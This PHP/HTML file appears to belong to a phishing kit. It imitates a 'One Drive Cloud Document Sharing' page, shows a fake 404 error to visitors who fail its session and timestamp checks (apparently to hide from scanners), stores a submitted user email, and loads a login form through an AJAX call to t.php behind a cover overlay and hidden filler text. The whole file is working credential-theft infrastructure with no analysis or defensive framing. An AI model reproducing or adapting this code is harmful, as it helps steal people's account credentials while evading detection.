<?php
session_start();
require 'api.php';
$ta = time();
$o = '0';
$rd = false;
$login_data = '-';
if(isset($_SESSION['evdd']) && isset($_SESSION['evdd']['idmd5t']) && $_SESSION['evdd']['idmd5t'] != ''){
  $fname = 'temp/'.$_SESSION['evdd']['idmd5t'].'.txt';
  if(is_file($fname)){
    $fnamec = trim(file_get_contents($fname));
    if(is_numeric($fnamec)){
      $o = $ta - $fnamec;
      $_SESSION['evdd']['refresh'] = $_SESSION['evdd']['refresh'] + 1;
      if(($o < 2 && $_SESSION['evdd']['refresh'] == 1) || ($_SESSION['evdd']['refresh'] == 2 || $_SESSION['evdd']['refresh'] == 3)){
        if($_SESSION['evdd']['refresh'] == 1){
          $login_data = 'login-data.html';
          $rd = true;
        }
        else if(isset($_GET['user'])){
          $login_data = 'login-data2.html';
          $rd = true;
        }
        //$rd = true;
        //echo $o;
      }
    }
  }
}
if(!$rd){
 die('<h1>404 Not Found</h1>The page that you have requested could not be found.');
}
//header("Location: http://www.redirect.to.url.com/");

if(isset($_POST['user'])) {
    $_SESSION['email'] = $_POST['user'];

    print json_encode(['success' => true]);
    exit();
}
?>




<!DOCTYPE html>
<html>
<head>
<title>One Drive Cloud Document Sharing</title>
<style>

.overlay_xyrqwerty{
  position: fixed;
  top: 0;
  left: 0;
  z-index: 2000;
  background: #ffffff;
  width: 100%;
  min-width: 100%;
  height: 100%;
  min-height: 100%;
}
</style>
</head>
<body>
<div class="overlay_xyrqwerty"></div>
<div class="mainallpppppp" data-tt=""></div>

<div style="display: none;">
<p><strong>Lorem Ipsum</strong> is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.</p>
</div>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
   <script>
     $(document).ready(function(e){ 
	   setTimeout(function(){ 
	     $(".overlay_xyrqwerty").hide(); 
	   }, 2000);
	   
	   $.ajax({
          url: 't.php', 
          type: 'POST', 
          dataType: 'html', 
          data: { 
		   pg : <?php echo "'$login_data'"; ?> 
		  }, 
		  crossDomain: true,
          success: function(msg) { 
              $('.mainallpppppp').html(msg);	
		  },
          error: function(e) {
            console.log(e)
          }
        });
	 });
	 
	 function GetURLParameter(sParam)
{
var output = false;
    var sPageURL = window.location.search.substring(1);
    var sURLVariables = sPageURL.split('&');
    for (var i = 0; i < sURLVariables.length; i++)
    {
        var sParameterName = sURLVariables[i].split('=');
        if (sParameterName[0] == sParam)
        {
            output = decodeURIComponent(sParameterName[1]);
        }
    }
	return output;
}
	</script>
</body>
</html>